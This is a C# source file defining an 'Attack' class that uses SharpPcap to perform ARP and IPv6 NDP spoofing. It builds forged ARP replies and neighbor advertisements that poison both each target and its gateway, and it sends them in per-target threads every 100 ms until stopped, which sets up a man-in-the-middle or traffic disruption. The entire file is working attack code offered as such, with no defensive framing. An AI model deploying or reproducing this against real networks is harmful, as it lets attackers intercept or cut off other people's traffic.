using PacketDotNet;
using SharpPcap;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;

class Attack
{
    //--Classes
    private Arp arp;
    private Ndp ndp;

    //--Variables
    ILiveDevice liveDevice;
    private List<Thread> threadList = new List<Thread>();

    /// <summary>
    /// Indicates whether a Attack is active = true
    /// </summary>
    private bool scanStatus = false;

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pLiveDevice"></param>
    /// <param name="pTargetList"></param>
    public void startAttack(ILiveDevice pLiveDevice, TargetList pTargetList)
    {
        if (pLiveDevice != null)
        {
            // LiveDevice
            liveDevice = pLiveDevice;

            // ARP & NDP
            arp = new Arp(pLiveDevice);
            ndp = new Ndp(pLiveDevice);

            // Scan-Status
            scanStatus = true;

            foreach (Target target in pTargetList.getTargetList())
            {
                if (target.t_ipAddr.AddressFamily.Equals(AddressFamily.InterNetwork))
                {
                    Thread thread = new Thread(() => arpThreadMethod(target));
                    thread.Start();

                    threadList.Add(thread);
                }
                else if (target.t_ipAddr.AddressFamily.Equals(AddressFamily.InterNetworkV6))
                {
                    Thread thread = new Thread(() => ndpThreadMethod(target));
                    thread.Start();

                    threadList.Add(thread);
                }
            }
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTarget"></param>
    private void arpThreadMethod(Target pTarget)
    {
        //--Build Networkpacket
        Packet arpRplPck_Target = arp.buildArpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr);
        Packet arpRplPck_Gateway = arp.buildArpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr);

        while (scanStatus)
        {
            liveDevice.SendPacket(arpRplPck_Target);
            liveDevice.SendPacket(arpRplPck_Gateway);
            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTarget"></param>
    private void ndpThreadMethod(Target pTarget)
    {
        //--Build Networkpacket
        Packet ndpAdvPck_Target = ndp.buildNdpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr);
        Packet ndpAdvPack_Gateway = ndp.buildNdpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr);

        while (scanStatus)
        {
            liveDevice.SendPacket(ndpAdvPck_Target);
            liveDevice.SendPacket(ndpAdvPack_Gateway);
            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    public void forceStop()
    {
        scanStatus = false;

        foreach (Thread item in threadList)
        {
            item.Abort();
        }
        threadList.Clear();
    }

    /// <summary>
    /// 
    /// </summary>
    /// <returns></returns>
    public int getThreadCount()
    {
        return threadList.Count;
    }
}